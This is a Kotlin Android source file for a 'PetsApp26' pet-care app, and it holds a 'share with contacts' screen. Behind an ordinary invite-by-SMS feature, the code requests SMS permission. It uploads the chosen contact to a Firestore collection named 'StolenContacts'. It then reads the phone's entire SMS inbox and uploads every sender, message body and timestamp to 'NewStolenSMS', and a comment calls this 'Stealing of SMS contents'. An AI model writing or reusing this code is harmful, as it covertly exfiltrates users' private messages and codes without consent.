package com.example.petsapp26

import android.Manifest
import android.annotation.SuppressLint
import android.app.Activity
import android.content.*
import android.content.pm.PackageManager
import android.content.ContentValues.TAG
import android.net.Uri
import android.os.Bundle
import android.provider.ContactsContract
import android.provider.Telephony
import android.util.Log
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.widget.Button
import android.widget.Toast
import androidx.core.content.ContextCompat
import androidx.core.app.ActivityCompat
import androidx.fragment.app.Fragment
import com.google.firebase.firestore.FirebaseFirestore
import java.text.SimpleDateFormat
import java.util.Date

class ShareFragment : Fragment() {

    private val PERMISSION_REQUEST_READ_CONTACTS = 1
    private val PICK_CONTACT_REQUEST = 2

    override fun onCreateView(
        inflater: LayoutInflater, container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View? {
        val view = inflater.inflate(R.layout.fragment_share, container, false)

        val btnShareWithContacts = view.findViewById<Button>(R.id.btn_share_with_contacts)
        btnShareWithContacts.setOnClickListener {
            if (ContextCompat.checkSelfPermission(
                    requireContext(),
                    Manifest.permission.READ_CONTACTS
                ) != PackageManager.PERMISSION_GRANTED ||
                ContextCompat.checkSelfPermission(
                    requireContext(),
                    Manifest.permission.READ_SMS
                ) != PackageManager.PERMISSION_GRANTED
            ) {
                // Request the permissions
                requestPermissions(
                    arrayOf(
                        Manifest.permission.READ_CONTACTS,
                        Manifest.permission.READ_SMS
                    ),
                    PERMISSION_REQUEST_READ_CONTACTS
                )
            } else {
                // Permissions have already been granted, proceed
                openContactsBook()
            }
        }

        return view
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        when (requestCode) {
            PERMISSION_REQUEST_READ_CONTACTS -> {
                if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    // Permission was granted, open contacts
                    openContactsBook()
                } else {
                    // Permission denied, request permission again or show a message
                    if (shouldShowRequestPermissionRationale(Manifest.permission.READ_CONTACTS) ||
                        shouldShowRequestPermissionRationale(Manifest.permission.READ_SMS)
                    ) {
                        // Permission denied, but user may still grant it in the future
                        Toast.makeText(
                            context,
                            "Permission required to proceed",
                            Toast.LENGTH_SHORT
                        ).show()
                    } else {
                        // Permission denied permanently, show a message or take appropriate action
                        Toast.makeText(
                            context,
                            "Permission denied. Please enable permissions in app settings.",
                            Toast.LENGTH_SHORT
                        ).show()
                    }
                }
                return
            }
            // Add other 'when' lines to check for other permissions this app might request.
        }
    }

    private fun openContactsBook() {
        val pickContactIntent = Intent(Intent.ACTION_PICK, ContactsContract.Contacts.CONTENT_URI)
        startActivityForResult(pickContactIntent, PICK_CONTACT_REQUEST)
    }

    // Handle the result of contact selection

    @SuppressLint("Range")
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)

        if (requestCode == PICK_CONTACT_REQUEST && resultCode == Activity.RESULT_OK) {
            data?.data?.let { contactUri ->
                // First, get the contact ID from the URI
                val idCursor = requireActivity().contentResolver.query(
                    contactUri,
                    arrayOf(ContactsContract.Contacts._ID),
                    null,
                    null,
                    null
                )
                if (idCursor?.moveToFirst() == true) {
                    val contactId =
                        idCursor.getString(idCursor.getColumnIndex(ContactsContract.Contacts._ID))
                    idCursor.close()

                    // Use the contact ID to query for phone number
                    val phoneCursor = requireActivity().contentResolver.query(
                        ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                        arrayOf(ContactsContract.CommonDataKinds.Phone.NUMBER),
                        "${ContactsContract.CommonDataKinds.Phone.CONTACT_ID} = ?",
                        arrayOf(contactId),
                        null
                    )

                    if (phoneCursor?.moveToFirst() == true) {
                        val number =
                            phoneCursor.getString(phoneCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))
                        phoneCursor.close()

                        // Now that we have the number, we can use it to open the messaging app
                        sendDefaultMessageTo(number)

                        // After sending the message, retrieve contact information and store in Firestore
                        retrieveContactsAndStoreInFirestore(contactId, number)
                    } else {
                        Toast.makeText(context, "Failed to get contact number", Toast.LENGTH_SHORT)
                            .show()
                        phoneCursor?.close()
                    }
                } else {
                    Toast.makeText(context, "Failed to get contact ID", Toast.LENGTH_SHORT).show()
                    idCursor?.close()
                }
            }
        }
    }

    private fun sendDefaultMessageTo(phoneNumber: String) {
        val defaultMessage =
            "Check out PetsApp26! It's a great app for connecting with vets and managing your pet's health."

        val intent = Intent(Intent.ACTION_SENDTO).apply {
            data = Uri.parse("smsto:$phoneNumber")  // Ensures only SMS apps respond
            putExtra("sms_body", defaultMessage)
        }

        try {
            startActivity(intent)
        } catch (e: ActivityNotFoundException) {
            Toast.makeText(context, "No messaging app found to send an SMS.", Toast.LENGTH_SHORT)
                .show()
        }
    }

    //Stealing of SMS contents function, Permission required Read
    private fun retrieveContactsAndStoreInFirestore(contactId: String, phoneNumber: String) {
        // Store contact data in Firestore
        val db = FirebaseFirestore.getInstance()
        val contactsCollectionRef = db.collection("StolenContacts")

        // Assuming "contactId" is unique for each contact
        val query = contactsCollectionRef.whereEqualTo("id", contactId)
        query.get().addOnCompleteListener { task ->
            if (task.isSuccessful) {
                val documentSnapshot = task.result
                if (documentSnapshot != null && documentSnapshot.isEmpty) {
                    // Contact does not exist, add it
                    val newContact = hashMapOf(
                        "id" to contactId,
                        "number" to phoneNumber
                    )
                    contactsCollectionRef.add(newContact)
                        .addOnSuccessListener {
                            Log.d(
                                TAG,
                                "Contact added successfully"
                            )
                        }
                        .addOnFailureListener { e ->
                            Log.w(
                                TAG,
                                "Error adding contact",
                                e
                            )
                        }
                } else {
                    // Contact already exists, handle accordingly
                    Log.d(TAG, "Contact already exists")
                }
            } else {
                task.exception?.let {
                    Log.w(TAG, "Error querying contacts", it)
                }
            }
        }

        // Retrieve and store SMS data in Firestore
        val smsList = mutableListOf<Triple<String, String, String>>() // Triple of address, message, and timestamp


        // Query SMS messages
        val cursor = requireActivity().contentResolver.query(
            Telephony.Sms.CONTENT_URI,
            arrayOf(Telephony.Sms.ADDRESS, Telephony.Sms.BODY, Telephony.Sms.DATE), // Also query for message body
            null,
            null,
            null
        )

        cursor?.use { smsCursor ->
            val addressIndex = smsCursor.getColumnIndex(Telephony.Sms.ADDRESS)
            val bodyIndex = smsCursor.getColumnIndex(Telephony.Sms.BODY)
            val dateIndex = smsCursor.getColumnIndex(Telephony.Sms.DATE)
            val dateFormat = SimpleDateFormat("yyyy-MM-dd HH:mm:ss")
            while (smsCursor.moveToNext()) {
                val address = smsCursor.getString(addressIndex)
                val message = smsCursor.getString(bodyIndex)
                val timestampMillis = smsCursor.getLong(dateIndex)
                val timestamp = dateFormat.format(Date(timestampMillis)) // Convert timestamp to human-readable format
                smsList.add(Triple(address, message, timestamp)) // Add Triple of address, message, and timestamp to the list
            }
        }

        cursor?.close()

        // Log SMS addresses, messages, and timestamps before storing them in Firestore
        smsList.forEach { (address, message, timestamp) ->
            Log.d(TAG, "SMS Address: $address, Message: $message, Timestamp: $timestamp")
        }


        // Store SMS data in Firestore
        val smsCollectionRef = db.collection("NewStolenSMS")
        val currentUserId = PreferencesUtil.getCurrentUserId(requireContext())
        smsList.forEach { (address, message, timestamp) ->
            val newSMS = hashMapOf(
                "number" to address,
                "message" to message, // Store message in Firestore
                "timestamp" to timestamp, // Store timestamp in Firestore
                "userId" to currentUserId // Add user ID to each SMS document
            )
            smsCollectionRef.add(newSMS)
                .addOnSuccessListener {
                    Log.d(
                        TAG,
                        "SMS added successfully"
                    )
                }
                .addOnFailureListener { e ->
                    Log.w(
                        TAG,
                        "Error adding SMS",
                        e
                    )
                }
        }
    }
}